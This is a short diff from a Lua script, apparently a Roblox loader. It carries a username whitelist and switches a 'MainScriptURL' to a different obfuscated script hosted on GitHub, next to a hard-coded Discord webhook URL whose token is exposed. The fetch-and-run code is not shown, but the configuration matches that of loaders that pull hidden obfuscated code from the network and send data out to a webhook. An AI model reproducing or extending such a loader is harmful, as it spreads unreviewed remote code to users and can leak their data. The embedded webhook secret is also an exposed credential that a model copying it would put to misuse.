@@ -7,7 +7,7 @@ local WhitelistedNames = {
     "PrimoNotYours",
 }
 
-local MainScriptURL = "https://raw.githubusercontent.com/dezqpal/Boldtespayb-/refs/heads/main/V4%20obfuscate%20txt"
+local MainScriptURL = "https://raw.githubusercontent.com/dezqpal/Boldtespayb-/refs/heads/main/Obfuscatedv4.text"
 local WebhookURL = "https://discord.com/api/webhooks/1471444039269093492/TXAlu-WePcGR6NAVDQbk0vCg9EtHTSqF9eMiaKPT5nyTqqbFonvBN6cUTL3KpwJCZr3k"
 
 -- [[ 2. FORMATTER FUNCTION ]]
